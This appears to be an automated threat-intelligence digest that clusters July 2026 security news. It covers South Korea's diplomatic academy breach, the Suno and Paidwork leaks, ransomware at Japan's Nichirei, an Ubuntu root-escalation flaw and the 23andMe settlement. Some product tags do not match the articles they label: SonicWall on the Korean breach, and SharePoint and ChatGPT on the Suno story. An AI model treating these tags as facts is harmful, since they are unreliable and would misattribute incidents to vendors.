- affected_products: SonicWall
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, data_breach
- affected_industries: government, education
- affected_products: SonicWall
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
South Korea disclosed that hackers breached the National Diplomatic Academy's online education system for ten months and stole personal information belonging to current and former employees of the Ministry of Foreign Affairs (MFA), including overseas diplomats. [...]
```

#### Full body

```
South Korea discloses data breach impacting diplomats worldwide By Bill Toulas July 22, 2026 04:06 PM 1 South Korea disclosed that hackers breached the National Diplomatic Academy's online education system for ten months and stole personal information belonging to current and former employees of the Ministry of Foreign Affairs (MFA), including overseas diplomats. The incident occurred in April 2025 after an unknown threat actor exploited a vulnerability in the Academy's server. It impacts at least 6,000 individuals, 350 of them being current government attachés dispatched abroad. The education platform was set up in 2022 to support remote training during the COVID-19 pandemic, and has since been used for government personnel training and video-conferencing. Ten-month hacker access According to the announcement , data was leaked between April 2025 and February 2026. “The personal information of current and former employees of the Ministry of Foreign Affairs headquarters and overseas missions, as well as other personnel, was leaked between April 2025 and February 2026,” the South Korean government says. It is estimated that the leaked information includes the IDs, names, email addresses, and encrypted passwords of individuals enrolled in the education system. MFA says that no unique identification numbers, sensitive information, mobile phone numbers, photographs, or home addresses were exposed in the incident. The ministry has blocked access to the online education system and implemented additional measures designed to strengthen security. During a press briefing today, an MFA spokesperson said the Ministry delayed disclosing the incident because of its sensitive nature and the need to thoroughly analyze and review the matter before making it public. "We recognized this issue in February, but we announced it five months later because of the sensitivity of the matter regarding our diplomatic and security affairs, and the need for careful review and analysis" - South Korea Foreign Ministry's spokesperson Park Il. Potentially impacted individuals are advised to watch for suspicious communications and report them immediately to the ministry’s security department. “Please exercise particular caution when receiving emails from unclear or unknown sources,” MFA warns. Korean media has reported that the number of affected individuals may be as high as 10,000 , while other sources report a lower number . They also noted that official job titles and departmental affiliations were exposed. One reason for the hack to remain undetected for this long was reportedly because the compromised server was located inside MFA's headquarters and was excluded from regular security scrutiny. The same reports mention that the breach was discovered in February 2026 by the country's National Intelligence Service, which alerted the MFA of the compromise. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Check Point warns of SmartConsole zero-day exploited in attacks Estée Lauder discloses data breach via Oracle E-Business flaw SonicWall SMA1000 flaws exploited as zero-days to push custom malware Progress confirms ShareFile zero-day flaw behind Storage Zone shutdown We built a vulnerability vending machine: AI tokens in, zero-days out
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: South Korea discloses data breach impacting diplomats worldwide
  - Published: 2026-07-22T20:06:54+00:00
  - Link: https://www.bleepingcomputer.com/news/security/south-korea-discloses-data-breach-impacting-diplomats-worldwide/
  - Summary: South Korea disclosed that hackers breached the National Diplomatic Academy's online education system for ten months and stole personal information belonging to current and former employees of the Ministry of Foreign Affairs (MFA), including overseas diplomats. [...]

### Cluster 57de1d00b3 — score 8

- Title: Suno, Paidwork Data Breaches Affect Tens of Millions of Accounts
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-07-22T15:02:11+00:00
- Link: https://www.securityweek.com/suno-paidwork-data-breaches-affect-tens-of-millions-of-accounts/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, data_breach, ransomware_extortion, zero_day
- affected_industries: financial_services, manufacturing_industrial
- affected_products: Microsoft SharePoint, OpenAI/ChatGPT
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft, zero_day, data_breach, active_exploitation
- affected_industries: financial_services, manufacturing_industrial
- affected_products: Microsoft SharePoint, OpenAI/ChatGPT
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers leaked names, email addresses, phone numbers, passwords, and financial information stolen from the two platforms. The post Suno, Paidwork Data Breaches Affect Tens of Millions of Accounts appeared first on SecurityWeek .
```

#### Full body

```
Hackers have stolen tens of millions of records from AI music generator Suno and gig-work platform Paidwork, according to data breach notification service Have I Been Pwned (HIBP). Suno was targeted in November 2025, and the intrusion came to light earlier this month, when 404 Media reported that hackers had obtained source code and user data. The stolen source code revealed that Suno had been scraping music and podcasts from major platforms such as Deezer, YouTube and Genius. [ Read: New Index Tracks Material Breaches — And Refuses to Add Up the Losses ] As for the compromised user data, HIBP analyzed it and reported on Monday that it had identified 55.3 million unique email addresses associated with Suno accounts. The leaked data also included phone numbers and tens of thousands of Stripe payment records, including names, physical addresses, purchase amounts, and partial payment card information (card type, expiration date, and last 4 digits of the card number). Advertisement. Scroll to continue reading. As for Paidwork, a platform where users complete small jobs for pay, hackers claimed to have targeted the company in March 2026. Last week, a threat actor leaked an 11 GB database allegedly stolen from Paidwork, claiming that it stores the information of roughly 22 million users. HIBP’s analysis identified 23.3 million unique email addresses in the leaked data, along with names, password hashes, physical addresses, dates of birth, phone numbers, bank account numbers, financial transactions, and user profile information. SecurityWeek has reached out to both Suno and Paidwork for comment. UPDATE: Paidwork has provided the following statement to SecurityWeek : We are aware of the Have I Been Pwned report but, at this time, Paidwork has no confirmed evidence that our systems or user accounts were compromised in the incident you referenced. We take reports like this seriously and have already escalated the matter to our security team for investigation. Related : OpenAI Says Its AI Models Broke Loose and Hacked Hugging Face Related : Ransomware Group Threatening to Leak Data Stolen From Coca-Cola’s Fairlife Related : Estée Lauder Discloses Impact From Oracle EBS Zero-Day Hack Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs US Warns of Iranian Hackers Targeting Siemens, Schneider, and Rockwell ICS Devices Flaw in Adobe Extension With 300M Installs Enabled WhatsApp Data Theft Fourth SharePoint Vulnerability Exploited in Past Month’s Wave of Attacks Oracle Patches Over 1,400 Vulnerabilities With Quarterly Security Updates Ransomware Group Threatening to Leak Data Stolen From Coca-Cola’s Fairlife OpenAI Says Its AI Models Broke Loose and Hacked Hugging Face Meta Paid $78,000 Bounty for Vulnerability Exposing Customer Support Data Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Latest News OpenAI Fixes ChatGPT Agent Flaw That Could Let Attackers Forge an AI Insider Is Patching Dead? Vulnerability Management in the Post-Mythos Era Chick-fil-A Accounts Get Fried in Credential Stuffing Attack Abstract Raises $25 Million to Expand Composable Security Operations Platform Nuclear-Sabotage Malware Benchmark Trips Up Most Frontier AI Models Upbound Group Says Data Breach Led to $13 Million in Fraudulent Contract Losses Assaf Keren Appointed New CISO of Meta New Check Point Zero-Day Vulnerability Exploited in the Wild Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from in
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Suno, Paidwork Data Breaches Affect Tens of Millions of Accounts
  - Published: 2026-07-22T15:02:11+00:00
  - Link: https://www.securityweek.com/suno-paidwork-data-breaches-affect-tens-of-millions-of-accounts/
  - Summary: Hackers leaked names, email addresses, phone numbers, passwords, and financial information stolen from the two platforms. The post Suno, Paidwork Data Breaches Affect Tens of Millions of Accounts appeared first on SecurityWeek .

### Cluster b849eebcfc — score 8

- Title: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-23T01:00:00+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, supply_chain
- affected_industries: financial_services, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain
- affected_industries: financial_services, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.
```

#### Full body

```
Cyberattacks & Data Breaches Cybersecurity Operations ICS/OT Security Vulnerabilities & Threats News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa, the Asia Pacific, Europe, and Latin America. Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken. Robert Lemos , Contributing Writer July 23, 2026 4 Min Read Source: Pack-Shot via Shutterstock Nichirei, a Japan-based frozen-food supplier and logistics firm, has largely recovered after a cyberattack disrupted its operations last week, resulting in curtailed shipments and leading Kentucky Fried Chicken franchises in the country to warn of shortages. Russia-linked ransomware group RansomHouse reportedly claimed credit for the breach earlier this week, posting some Nichirei data to the Dark Web. Nichirei acknowledged the breach but has only provided limited details on the actual events, which impacted its logistics and shipping operations. "We are proceeding with business recovery after implementing security measures in collaboration with an external security firm," the company said in a July 22 Japanese-language statement (translated via Kagi Translate). "Regarding the warehousing and frozen food shipping operations affected by the system failure, all locations are scheduled to transition to normal operations within this week." Related: Brazilian Banking Trojan Actively Spreading in Portugal The incident combines the top two threats affecting Japanese companies: ransomware and attacks targeting supply chains and subcontractors, according to an annual list published by the Information-technology Promotion Agency, part of Japan's Ministry of Economy, Trade, and Industry (METI). The cyber-risks surrounding the adoption of AI came in third — the first time that threat appeared on the list. In October 2025, Japanese beer giant Asahi suffered a ransomware attack that disrupted beer shipments for nearly two weeks , affected business operations for two months, and required until this February to completely rebuild systems and recover data. Nearly half of all Japanese companies (46%) have suffered a ransomware attack, according to a survey by the Japan Institute for the Promotion of Digital Economy and Community (JIPDEC). The National Police Agency (NPA) recorded 226 reports of ransomware attacks resulting in damage in 2025. Supply Chain Runs from Japan to KFC The attack on Nichirei had a direct impact on its approximately 5,000 customers, including Kentucky Fried Chicken, which warned last week that its franchises in Japan may have cut back hours. Nichirei manages a fleet of about 7,000 refrigerated vehicles from 141 different logistics centers and warehouses. The ripples of the ransomware attack demonstrate how a tightly knit supply chain can be dramatically affected by a cybersecurity event, says Collin Hogue-Spears, senior director of solution management at Black Duck, a software-security firm. "Attackers compromised one company's servers, [and] Japan's procurement model spread that compromise across the national food supply," he says. Related: Ransomware Thugs Masquerade as Interpol to Entice Small Biz Companies need to practice ransomware recovery, he says. A good backup strategy is not enough if restoration takes weeks. If prevention requires severing the network, then the company has to be able to operate offline, says John Gallagher, vice president at Viakoo, a provider of automated IoT cyber hygiene. "Nichirei's decision to sever internal networks is a classic response to active encryption or lateral movement across operational subnetworks," he says, adding: "Japan's logistics ecosystem operates on hyper-efficient [just in time] delivery models with minimal buffer inventory. A 48-hour network freeze quickly leads to empt
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain
  - Published: 2026-07-23T01:00:00+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain
  - Summary: A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.

### Cluster 6490abfb48 — score 8

- Title: The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success
- Source: Black Hills Information Security (detection_response_operations)
- Published: 2026-07-22T14:00:00+00:00
- Link: https://www.blackhillsinfosec.com/life-of-a-soc-analyst/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Security Operations Centers (SOCs) serve as a critical line of defense against today's constantly evolving cybersecurity threats. At the heart of these teams are SOC analysts, who monitor, detect, and respond around the clock to potential attacks. The post The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success appeared first on Black Hills Information Security, Inc. .
```

#### Corroborating sources (1)

- **Black Hills Information Security** (detection_response_operations)
  - Title: The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success
  - Published: 2026-07-22T14:00:00+00:00
  - Link: https://www.blackhillsinfosec.com/life-of-a-soc-analyst/
  - Summary: Security Operations Centers (SOCs) serve as a critical line of defense against today's constantly evolving cybersecurity threats. At the heart of these teams are SOC analysts, who monitor, detect, and respond around the clock to potential attacks. The post The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success appeared first on Black Hills Information Security, Inc. .

### Cluster 7ad1b91bfd — score 8

- Title: Ubuntu snap-confine Vulnerability Enables Local Root Access
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-07-22T10:50:00+00:00
- Link: https://www.infosecurity-magazine.com/news/ubuntu-snap-confine-local-root-cve/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
New Ubuntu snap-confine race condition lets local users escalate to root on default installs
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Ubuntu snap-confine Vulnerability Enables Local Root Access
  - Published: 2026-07-22T10:50:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/ubuntu-snap-confine-local-root-cve/
  - Summary: New Ubuntu snap-confine race condition lets local users escalate to root on default installs

### Cluster 0dd49c6456 — score 8

- Title: 23andMe Faces New Security Mandates in $18m Data Breach Settlement
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-07-17T14:30:00+00:00
- Link: https://www.infosecurity-magazine.com/news/23andme-18m-data-breach-settlement/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
23andMe has agreed to an $18m settlement with 42 US attorneys general over its 2023 data breach, including enhanced data protection requirements
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: 23andMe Faces New Security Mandates in $18m Data Breach Settlement
  - Published: 2026-07-17T14:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/23andme-18m-data-breach-settlement/
  - Summary: 23andMe has agreed to an $18m settlement with 42 US attorneys general over its 2023 data breach, including enhanced data protection requirements
